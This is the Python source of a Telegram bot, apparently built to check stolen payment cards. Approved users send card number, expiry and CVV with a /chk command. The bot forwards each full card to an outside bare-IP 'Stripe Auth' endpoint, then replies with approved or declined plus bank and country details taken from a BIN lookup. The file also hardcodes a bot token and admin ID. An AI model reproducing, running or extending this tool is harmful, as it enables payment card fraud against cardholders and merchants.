import telebot
import aiohttp
import asyncio
import re
import json
import os

BOT_TOKEN = "8004268722:AAHLYhpethBQAt3rdszvxIxt-YTyv7GBQD0"
ADMIN_ID = 6317271346   

CONTACT_USERNAME = "@Dhruv0757" 

ALLOWED_USERS_FILE = "allowed_users.json"
if os.path.exists(ALLOWED_USERS_FILE):
    with open(ALLOWED_USERS_FILE, "r") as f:
        ALLOWED_USERS = set(json.load(f))
else:
    ALLOWED_USERS = set()
    with open(ALLOWED_USERS_FILE, "w") as f:
        json.dump(list(ALLOWED_USERS), f)

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, "w") as f:
        json.dump(list(ALLOWED_USERS), f)

bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

def is_admin(user_id):
    return int(user_id) == ADMIN_ID

def is_allowed(user_id):
    return int(user_id) == ADMIN_ID or str(user_id) in ALLOWED_USERS

def extract_card(text):
    patt = r'(\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})'
    match = re.search(patt, text.replace(' ', ''))
    return match.group(1) if match else None

def style_api_response(api_resp):
    resp = api_resp.strip().lower()
    if resp == "approved":
        return "Approved ✅"
    elif resp == "declined":
        return "Declined ❌"
    return api_resp

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=3) as res:
                try:
                    data = await res.json()
                    brand = data.get('brand', 'VISA')
                    ctype = data.get('type', 'DEBIT')
                    level = data.get('level', 'STANDARD')
                    bank = data.get('bank', 'UNKNOWN BANK')
                    country = data.get('country_name', 'UNKNOWN')
                    flag = data.get('country_flag', '🏳️')
                except:
                    text = await res.text()
                    if ";" in text:
                        fields = text.split(";")
                        while len(fields) < 6:
                            fields.append('UNKNOWN')
                        brand, ctype, level, bank, country, iso = fields[:6]
                        flag = ''
                    else:
                        brand = 'VISA'
                        ctype = 'DEBIT'
                        level = 'STANDARD'
                        bank = 'UNKNOWN BANK'
                        country = 'UNKNOWN'
                        flag = '🏳️'
                return {
                    "brand": brand,
                    "type": ctype,
                    "level": level,
                    "bank": bank,
                    "country": country,
                    "flag": flag
                }
    except:
        return {
            "brand": 'VISA',
            "type": 'DEBIT',
            "level": 'STANDARD',
            "bank": 'UNKNOWN BANK',
            "country": 'UNKNOWN',
            "flag": '🏳️'
        }

async def call_api(card):
    url = f"http://147.93.102.245:5000/au={card}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as res:
                resp = await res.text()
                return resp.strip()
    except Exception as e:
        return f"API ERROR: {e}"

def format_reply(card, api_resp, bininfo):
    brand = bininfo['brand']
    ctype = bininfo['type']
    level = bininfo['level']
    bank = bininfo['bank']
    country = bininfo['country']
    flag = bininfo.get('flag', '')
    return (
        f"𝗖𝗮𝗿𝗱 ➜ <code>{card}</code>\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ <code>{api_resp}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ <code>Stripe Auth</code>\n"
        "━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        f"𝗜𝗻𝗳𝗼 ➜ <code>{brand} - {ctype} - {level}</code>\n"
        f"𝐁𝐚𝐧𝐤 ➜ <code>{bank}</code>\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ <code>{country} {flag}</code>\n"
    )

@bot.message_handler(commands=['start'])
def start_message(message):
    user = message.from_user
    username = f"@{user.username}" if user.username else user.first_name
    text = (
        f"<b>Welcome {username} To The Bot</b>\n"
        f"\n"
        f"<b>Use:</b> <code>/chk &lt;card&gt;</code>\n"
        f"\n"
        f"<b>Bot By @Vunxx</b>"
    )
    bot.reply_to(message, text, parse_mode="HTML")
    


@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n\n/allow - 𝐀𝐥𝐥𝐨𝐰 𝐔𝐬𝐞𝐫𝐬\n/demote - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫𝐬\n/users - 𝐕𝐢𝐞𝐰 𝐔𝐬𝐞𝐫𝐬",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['allow'])
def allow_user(message):
    if is_admin(message.from_user.id):
        args = message.text.split()
        if len(args) == 2 and args[1].isdigit():
            ALLOWED_USERS.add(args[1])
            save_allowed_users()
            bot.reply_to(message, f"✅ User {args[1]} is allowed to use the bot.")

@bot.message_handler(commands=['demote'])
def demote_user(message):
    if is_admin(message.from_user.id):
        args = message.text.split()
        if len(args) == 2 and args[1].isdigit() and args[1] in ALLOWED_USERS:
            ALLOWED_USERS.remove(args[1])
            save_allowed_users()
            bot.reply_to(message, f"❌ User {args[1]} removed from allowed list.")

@bot.message_handler(commands=['users'])
def list_users(message):
    if not is_admin(message.from_user.id):
        return
    if not ALLOWED_USERS:
        bot.reply_to(message, "No users currently allowed.", parse_mode="Markdown")
        return

    text = "𝐀𝐥𝐥𝐨𝐰𝐞𝐝 𝐔𝐬𝐞𝐫𝐬\n\n"
    count = 1
    for uid in ALLOWED_USERS:
        try:
            user_info = bot.get_chat(int(uid))
            username = f"@{user_info.username}" if user_info.username else "NoUsername"
        except Exception:
            username = "NoUsername"
        text += f"{count}. {username} <code>{uid}</code>\n"
        count += 1
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda m:
    (m.text and (m.text.lower().startswith('/chk') or m.text.lower().startswith('.chk')))
    or
    (m.reply_to_message and (m.text and m.text.lower().strip() in ['/chk', '.chk']))
)
def handle_chk(message):
    user_id = message.from_user.id
    if not is_allowed(user_id):
        bot.reply_to(
            message,
            f"You are not approved. Contact: {CONTACT_USERNAME}",
            parse_mode="HTML"
        )
        return

    
    if message.reply_to_message and message.text.strip().lower() in ['/chk', '.chk']:
        text = message.reply_to_message.text or ''
    else:
        text = message.text
        if " " in text:
            text = text.split(" ", 1)[1]
        else:
            text = ""
    card = extract_card(text)
    if not card:
        bot.reply_to(message, "❌ Invalid or missing card format!", parse_mode="HTML")
        return

    bin_number = card.split('|')[0][:6]
    sent = bot.reply_to(message, "<b>Checking Your Card...\n Stripe Auth API</b>", parse_mode="HTML")

    async def process():
        api_resp, bininfo = await asyncio.gather(
            call_api(card),
            get_bin_info(bin_number)
        )
        styled_api_resp = style_api_response(api_resp)
        reply = format_reply(card, styled_api_resp, bininfo)
        try:
            bot.edit_message_text(reply, message.chat.id, sent.message_id, parse_mode="HTML")
        except Exception:
            bot.send_message(message.chat.id, reply, parse_mode="HTML")

    asyncio.run(process())

if __name__ == "__main__":
    print("BOT IS RUNNING...")
    bot.infinity_polling(skip_pending=True)
